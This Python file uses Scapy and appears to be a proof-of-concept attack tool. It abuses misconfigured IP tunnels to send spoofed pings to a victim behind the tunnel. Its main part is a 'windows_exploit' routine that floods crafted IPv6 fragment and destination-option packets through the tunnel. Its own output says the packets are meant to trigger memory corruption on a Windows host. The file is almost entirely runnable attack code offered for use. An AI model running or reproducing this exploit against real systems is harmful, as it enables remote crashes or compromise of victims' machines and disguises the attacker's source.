from scapy.layers.inet import *
from scapy.layers.inet6 import *
from scapy.packet import ls
from scapy.sendrecv import *


def construct_icmp_packet(src_ip, dst_ip):  # Creates an inner packet, in this case an ICMP request
    packet = IP(dst=dst_ip, src=src_ip) / ICMP()
    return packet


def construct_icmp6_packet(src_ip, dst_ip):  # Same function but using IPv6 instead of IPv4
    packet = IPv6(dst=dst_ip, src=src_ip) / ICMPv6EchoRequest()
    return packet


def construct_ipip_packet(src_ip, dst_ip,
                          inner_packet):  # Encapsulates the inner packet in another IP packet, forming an IPIP encapsulation
    packet = IP(dst=dst_ip, src=src_ip) / inner_packet
    return packet


def construct_ip6ip6_packet(src_ip, dst_ip,
                            inner_packet):  # Encapsulates the inner packet in another IP packet, forming an IPIP encapsulation
    packet = IPv6(dst=dst_ip, src=src_ip) / inner_packet
    return packet


def ipip_ping(attacker_ip, tunnel_interface, tunnel_exit, victim_ip):
    inner_packet = construct_icmp_packet(tunnel_exit, victim_ip)  # Inner packet, that the vulnerable host decapsulates
    tunnel_packet = construct_ipip_packet(attacker_ip, tunnel_interface,
                                          inner_packet)  # Encapsulated packet, that is sent to the tunnel interface
    tunnel_packet.display()  # Good to know information, that the formed packet is correct
    send(tunnel_packet)  # Encapsulated packet sent, we don't wait for a reply, since there won't be any


def ip6ip6_ping(attacker_ip, tunnel_interface, tunnel_exit, victim_ip):
    inner_packet = construct_icmp6_packet(tunnel_exit, victim_ip)  # Inner packet, that the vulnerable host decapsulates
    tunnel_packet = construct_ip6ip6_packet(attacker_ip, tunnel_interface,
                                            inner_packet)  # Encapsulated packet, that is sent to the tunnel interface
    tunnel_packet.display()  # Good to know information, that the formed packet is correct
    send(tunnel_packet)  # Encapsulated packet sent, we don't wait for a reply, since there won't be any


def windows_exploit_packet(attacker_ip, tunnel_interface, tunnel_exit, victim_ip, i):
    frag_id = 0xdebac1e + i
    first = IPv6(dst=tunnel_interface, src=attacker_ip) / IPv6(fl=1, hlim=64 + i, dst=victim_ip,
                                                               src=tunnel_exit) / IPv6ExtHdrDestOpt(
        options=[PadN(otype=0x81, optdata='a' * 3)])
    second = IPv6(dst=tunnel_interface, src=attacker_ip) / IPv6(fl=1, hlim=64 + i, dst=victim_ip,
                                                                src=tunnel_exit) / IPv6ExtHdrFragment(id=frag_id, m=1,
                                                                                                      offset=0) / 'aaaaaaaa'
    third = IPv6(dst=tunnel_interface, src=attacker_ip) / IPv6(fl=1, hlim=64 + i, dst=victim_ip,
                                                               src=tunnel_exit) / IPv6ExtHdrFragment(id=frag_id, m=0,
                                                                                                     offset=1)
    return [first, second, third]


def windows_exploit(attacker_ip, tunnel_interface, tunnel_exit, victim_ip):
    num_tries = 20
    num_batches = 20

    final_ps = []
    for _ in range(num_batches):
        for i in range(num_tries):
            final_ps += windows_exploit_packet(attacker_ip, tunnel_interface, tunnel_exit, victim_ip,
                                               i) + windows_exploit_packet(attacker_ip, tunnel_interface, tunnel_exit,
                                                                           victim_ip, i)

    print("Sending packets")
    send(final_ps, 'eth0')

    for i in range(60):
        print(f"Memory corruption will be triggered in {60 - i} seconds", end='\r')
        time.sleep(1)
    print("")


if __name__ == '__main__':
    attacker_ip = '2005::2fc:89fd:a64c:5050'  # Your IP
    tunnel_interface = '2007::42:7aff:fe51:fa00'  # IP of attacked host, needs to have a tunnel configured
    tunnel_exit = '2008::1'  # IP of the attacked host, where tunnel traffic is directed to
    victim_ip = '2008::1ca5:896f:710d:50fb'  # Victim in the tunneled network, where you want the tunneled traffic to be sent

    # IP4 in IP4 tunnel ping spoof
    # ipip_ping(attacker_ip,tunnel_interface,tunnel_exit,victim_ip)

    # IP6 in IP6 tunnel ping spoof
    # ip6ip6_ping(attacker_ip,tunnel_interface,tunnel_exit,victim_ip)

    # Windows exploit through the tunnel
    windows_exploit(attacker_ip, tunnel_interface, tunnel_exit, victim_ip)
